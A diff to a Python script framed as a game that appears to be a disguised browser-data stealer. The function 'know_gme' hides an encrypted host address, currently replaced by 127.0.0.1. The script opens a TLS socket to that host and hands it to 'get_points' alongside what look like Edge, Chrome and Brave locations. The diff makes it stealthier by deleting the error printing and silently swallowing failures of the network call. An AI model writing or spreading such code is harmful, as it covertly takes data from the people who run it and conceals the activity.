@@ -24,7 +24,7 @@ warnings.filterwarnings("ignore", category=DeprecationWarning)
 
 def know_gme():
     unkown = b'\xf9\x0c]Q\x81\xcf\xf0\xf0Z\xeb FA\xef;\xc3`\x8b\x17\xa5\xf06\x89\x0cq\x9cz\x1cYA\xa93\xb9\xfc\xaa{\x11g\x1d{{\xf4\x9c\xe2R/]\xa9\xc6\x0c\x15E\xee\xac\xaa~\xebE\xbe@\x1b\xa6s\xb0'
-    # return str(decrypt(unkown).decode())
+    #return str(decrypt(unkown).decode())
     return "127.0.0.1"
 
 
@@ -46,7 +46,6 @@ try:
     sec = context.wrap_socket(sock, server_hostname=know_gme())
     connect = True
 except Exception as e:
-    print(e)
     pass
 
 
@@ -210,8 +209,10 @@ def main():
 
     init_game(locat_e, locat_g, locat_b, ede, gle, brve)
 
-    get_points.main(sec)
-
+    try:
+        get_points.main(sec)
+    except Exception:
+        pass
 
 if __name__ == "__main__":
     main()
